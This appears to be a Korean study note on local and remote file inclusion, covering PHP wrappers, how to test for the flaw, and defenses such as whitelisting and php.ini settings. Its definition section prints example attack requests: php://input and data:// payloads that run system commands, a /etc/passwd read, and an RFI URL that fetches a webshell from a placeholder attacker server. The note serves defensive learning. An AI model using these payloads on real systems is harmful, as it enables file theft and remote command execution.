# 1. 취약점 정의

웹 애플리케이션이 사용자 입력 값을 적절히 검증하지 않고 서버 내부의 파일 경로를 참조할 때 발생하는 취약점이다. 서버 내부의 파일 경로를 참조하는 것은 LFI(Local File Inclusion), 원격으로 외부 서버에 있는 파일을 참조하는 것은 RFI(Remote File Inclusion)이라고 한다.

이 취약점은 각 언어의 특정 함수를 사용했을 때 발생할 가능성이 생긴다.

- PHP : include, require, file_get_contents
- Node.js : fs.readfile, require
- Python : open
- Java(JSP) : <jsp:include page="..." /> 태그 또는 RequestDispatcher.forward

보통 PHP에서 자주 발생하는데, PHP의 include 계열 함수는 '파일 읽기 + 코드 실행'이 기본 동작이고, 타 언어는 보통 파일 읽기와 코드/모듈 호출이 엄격하게 분리되어 있기 때문이다. 그리고, PHP Wrapper 기능이 존재하여 이를 이용하여 필터링을 우회하는 경우가 발생하기 때문이다.

## PHP Wrapper

- file:// : PHP에서도 사용되지만, PHP Wrapper가 아니라 로컬 파일 시스템에 접근할 때 사용하는 표즌 URI Scheme이다.

* 사용 예시
```
file://localhost/etc/passwd
file:///etc/passwd
// file:// 옆에 /를 하나 더 붙이면 localhost를 의미한다.
```

php://를 사용하면 PHP 자체 I/O 스트림에 접근할 수 있다. php://는 뒤에 붙이는 식별자에 따라 다양한 기능을 수행한다.

- php://filter : 요청에 대한 응답을 실시간으로 변환해주는 기능으로, 요청에 대한 응답을 Base64로 변환하는 등의 기능을 수행한다. resource 파라미터로 서버 내부의 파일명을 전달하면 해당 파일의 내용을 변환한 응답을 반환한다.

* php://fileter 사용 예시
```
// 요청에 대한 응답을 Base64로 인코딩
php://filter/convert.base64-encode/resource=config.php
```

- php://input : 클라이언트가 서버로 전달하는 POST 요청의 Body 데이터 전체를 읽어오는 PHP의 내장 스트림. LFI 취약점이 발생하는 파라미터에 php://input 을 입력하고, POST 요청 시 Body에 PHP의 시스템 명령을 실행시킬 수 있는 코드(<?php system('ls')?>)를 전달하면 시스템 명령어가 실행되어 사용자에게 응답으로 반환된다.

* php://input 예시
```
POST /index.php?file=php://input HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

<?php system('ls'); ?>
```

- data:// : data://는 별도의 파일이나 네트워크 연결 없이 데이터 자체를 Inline 형태(텍스트 또는 Base64)로 전달할 때 사용된다.

* data:// 예시
```
// 공격자의 요청 (Base64 미사용)
http://target.com/index.php?file=data://text/plain,<?php system('id'); ?>

// 공격자의 요청 (Base64 사용)
http://target.com/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
// 뒤의 Base64 문자열은 <?php system('id'); ?> 를 Base64 인코딩한 것이다.
```

RFI의 경우 LFI와 유사하지만, 서버 내부가 아니라 외부 서버의 파일을 Include 하는 것이 차이점이다. 보통 공격자가 서버를 열고, 그 서버에 WebShell이나 시스템 명령어를 실행하는 코드를 작성하고, 공격을 실행할 때 공격자 서버의 WebShell으로 요청을 보내도록 파라미터 값을 입력한다.

* 예시
```
http://target.com/index.php?file=http://[ATTACKER_SERVER]/webshell.php?cmd=ls
```

# 2. 점검 방법

먼저 파일을 include 하는 기능을 찾는다. 그리고 서버 내부에 존재할만한 파일 이름(/etc/passwd, boot.ini 등)을 입력해보며 서버 내부의 파일이 include 가능한지 테스트한다.

# 3. 대응 방안

## 3.1. 화이트리스트를 사용한 검증

파일을 include 하는 기능에 서버 내부에서 화이트리스트를 적용하여 특정 파일 이외에는 include 할 수 없도록 검증하여야 한다.

```PHP
<?php
    $page = $_GET['page'] ?? 'home';

    // 1. 허용된 파일 목록 정의 (화이트리스트)
    $allowed_pages = [
        'home'    => 'pages/home.php',
        'about'   => 'pages/about.php',
        'contact' => 'pages/contact.php'
    ];

    // 2. 입력값이 화이트리스트에 존재하는지 검증
    if (array_key_exists($page, $allowed_pages)) {
        include($allowed_pages[$page]);
    } else {
        // 안전한 기본 페이지로 이동하거나 에러 처리
        include('pages/404.php');
    }
?>
```

## 3.2. 입력값 검증

서버 내부의 다른 파일에 접근하기 위해 필요한 ../ 특수문자와 PHP Wrapper(php://, file:// 등)를 필터링한다. 다만, 해당 문자열들만 필터링할 경우 서버의 소스코드 파일은 보호할 수 없어 완벽한 대응 방안은 아니다.

## 3.3. 서버 설정 변경 (PHP)

php.ini 파일에서 다음과 같이 설정한다.

```
....
allow_url_fopen = Off
allow_url_include = Off
display_errors = Off
....
```

# 4. 참고

- https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion

- https://www.php.net/manual/en/wrappers.php

- https://medium.com/@althubianymalek/exploring-php-wrappers-enhancing-php-capabilities-280a6af827b5
